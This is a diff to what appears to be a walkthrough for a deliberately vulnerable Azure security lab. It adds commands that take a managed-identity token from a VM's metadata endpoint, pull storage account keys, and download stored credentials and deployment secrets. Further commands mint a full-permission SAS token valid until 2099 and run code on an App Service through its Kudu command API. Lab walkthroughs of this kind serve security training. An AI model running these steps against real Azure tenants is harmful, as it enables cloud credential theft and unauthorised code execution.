@@ -159,23 +159,73 @@ After RDP/RCE on `Donnager`:
 - Cleartext credentials in the registry (`Get-ItemProperty 'HKLM:\SOFTWARE\Expanse'`, also stored as the `cmdkey` generic credential.
 - MI `JovianAccess` also holds `Storage Account Contributor` on `labpallas`. This is a control-plane role and does not grant data access by itself, but it allows calling `listKeys` - and an account key bypasses every scoped data-plane role, giving full read/write to all containers and file shares.
 
-Log in as the Donnager MI and pull an account key, then use it as any storage owner would:
+Run a command on the Donnager and pull an account key, then use it as any storage owner would:
 ```bash
-az login --identity --user [Donnager_MI_principal_id]
-KEY=$(az storage account keys list -g [your_rg] -n labpallas[suffix] --query "[0].value" -o tsv)
+# Get MI JWT token
+az vm run-command invoke \
+  --resource-group ExpanseAzureSecLab \
+  --name Donnager \
+  --command-id RunPowerShellScript \
+  --scripts '
+$kvToken = (Invoke-RestMethod -Headers @{Metadata="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01").access_token
+$vault = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Expanse").KeyVaultName
+
+Write-Output "Vault: $vault"
+Write-Output "Token : $kvToken"
+'
+
+# Set vars
+ARM_TOKEN="[$kvTokenOutput]"
+SUB="[your_sub_id]"
+RG="[your_rg]"
+SA="labpallas[suffix]"
+BLOB="labpallas-[suffix]"
+
+# Get Storage Account Keys
+curl -sS -X POST \
+  -H "Authorization: Bearer $ARM_TOKEN" \
+  -H "Content-Type: application/json" \
+  "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2026-04-01" \
+  --data '{}'
+
+KEY="[your account key]"
 
 # List and download everything in the container (Alex's credentials.json, the Tycho source package)
-az storage blob list     --account-name labpallas[suffix] --account-key "$KEY" -c pallas-[suffix] -o table
-az storage blob download --account-name labpallas[suffix] --account-key "$KEY" -c pallas-[suffix] -n credentials.json -f ./credentials.json
+az storage blob list     --account-name $SA --account-key "$KEY" -c $BLOB -o table
+az storage blob download --account-name $SA --account-key "$KEY" -c pallas-[suffix] -n credentials.json -f ./credentials.json
 
 # Reach the file share that mirrors the same secrets
-az storage file list     --account-name labpallas[suffix] --account-key "$KEY" -s medina -o table
+az storage file list     --account-name $SA --account-key "$KEY" -s medina -o table
+
+# Get access to the storage table on that account
+az storage table list --account-name $SA --account-key "$KEY" -o table
+# Extract the data
+az storage entity query --account-name $SA --account-key "$KEY" --table-name deploycreds
 ```
 The key also lets you mint a full-permission account SAS for offline reuse, independent of the MI:
 ```bash
 az storage account generate-sas --account-name labpallas[suffix] --account-key "$KEY" \
   --services bfqt --resource-types sco --permissions rwdlacup --expiry 2099-01-01 -o tsv
 ```
+
+### Use Storage Table SP for App Service RCE
+
+The SP that can be found in the table of the storage account (readable using the storage key) has Contributor on the tycho-webapp. We can use this to execute code on it. Example assumes you are logged into az cli as the SP:
+
+```bash
+
+APP="<app_name>"
+
+TOKEN=$(az account get-access-token \
+  --resource https://management.azure.com/ \
+  --query accessToken -o tsv)
+
+curl -i -sS -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  "https://${APP}.scm.azurewebsites.net/api/command" \
+  --data '{"command":"id","dir":"/home/site/wwwroot"}'
+  ```
 
 
 ### AKS Secrets Access
